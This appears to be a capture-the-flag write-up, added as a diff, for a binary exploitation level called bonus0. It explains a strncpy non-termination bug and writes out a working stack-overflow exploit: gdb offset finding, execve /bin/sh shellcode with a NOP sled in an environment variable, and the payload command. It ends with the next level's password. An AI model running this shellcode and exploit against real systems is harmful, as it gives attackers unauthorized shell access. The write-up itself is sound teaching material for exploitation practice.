@@ -1,0 +1,57 @@
+Three functions. First one is [main] obviously, it initialises a buffer of 54 then calls a function named [pp],
+and finally a [puts] on the buffer.
+[pp] calls [p] twice, on two strings that are initialised inside the function, both 20 bytes. Then a strcpy
+is done, from the first string to the main's buffer. A space is put at buffer[strlen[buffer]]. Finally a strcat
+is done, concatening the second string at the end of the buffer.
+[p] has a buffer of 4096. It first prints a " - ", then reads 4096 bytes and stores it in the buffer. It checks
+for a newline and replaces it with \0, and finally it copies 20 characters of the buffer to the string given as parameter.
+
+The result is simple: the program prints " - ", then waits for user input. It stores 20 bytes of it inside a variable, then
+does the same a second time, on a second variable. Both variables are then stored inside another buffer, separated by a space
+and the result is printed.
+
+[p] has a flaw. For the first string, the strncpy function copies only 20 characters, but a security flaw arises if the string
+isn't null terminated. Then in the next call to [p] for the second string, the characters will be written right next to the first,
+with no \0 separating them. When the strcpy to the main's buffer is called, instead of 20 characters, there will be 40. Then there's
+an strcat...->buffer overflow.
+
+We'll use wiremask.eu's pattern generator to try to find the offset.
+
+(gdb) > r
+ -
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+ -
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+0x41336141 in ??()
+
+Thanks to wiremask, we know the offset is 9.
+
+There doesn't seem to be a way to store our shellcode inside the program's memory, as there's no call to malloc on the heap, and the buffer
+is too small.
+After much research, I learn how we can store it in the env.
+First, I need to find the Shellcode, using a NOP-sled. I'm using the same shellcode as last time.
+
+> export SHELLCODE=$(python -c "print '\x90'*90 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
+
+The NOP-sled is a series of NOP instructions (instructions that do nothing but are present) meant to "slide" the program into the shellcode's actual instructions.
+
+Then I write a small program that prints SHELLCODE's address in the env.
+Basically, inside /tmp/, a little .c that does a printf("%p\n", getenv("SHELLCODE")). 
+I compile it, and execute it.
+
+>/tmp/getenv
+0xbffff8a2
+
+Now that I have the address, I can finally write the actual payload.
+The trick, since it's actually complicated to write it in the program, is to write it in a file, then cat it to the program.
+That way we can write all the \x characters.
+So that is, filling the first buffer to the brim, adding a \n to write the second string, the offset of 9 then the env SHELLCODE's address.
+Then ending the 20 bytes with 7 bytes of padding.
+
+>python -c "print 'X'*4095 + '\n' + 'X' * 9 + '\xa2\xf8\xff\xbf' + 'X' * 7" > /tmp/bonus0
+-
+-
+XXXXX [...]
+$>cd ../bonus1
+$>cat .pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
